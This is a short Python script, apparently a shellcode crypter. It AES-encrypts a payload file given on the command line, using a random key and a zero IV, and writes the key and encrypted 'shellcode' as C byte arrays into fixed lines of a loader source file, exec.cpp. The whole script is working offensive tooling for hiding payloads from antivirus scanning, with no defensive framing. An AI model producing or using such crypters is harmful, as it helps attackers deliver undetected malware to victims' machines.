import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext, key):
    k = hashlib.sha256(KEY).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key

  
def printResult(key, ciphertext):
    #print('char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
    with open("./exec.cpp", "r") as f:
        list_of_lines = []
        for l in f.readlines():
            list_of_lines.append(l)
        list_of_lines[54] = '    unsigned char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };\n'
        list_of_lines[55] = '    unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };\n'
    writer = open('exec.cpp', "w")
    for x in list_of_lines:
        writer.write(x)
    #print('unsigned char AESshellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
    
try:
    file = open(sys.argv[1], "rb")
    content = file.read()
except:
    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
    sys.exit()


KEY = urandom(16)
ciphertext, key = AESencrypt(content, KEY)

printResult(KEY,ciphertext)

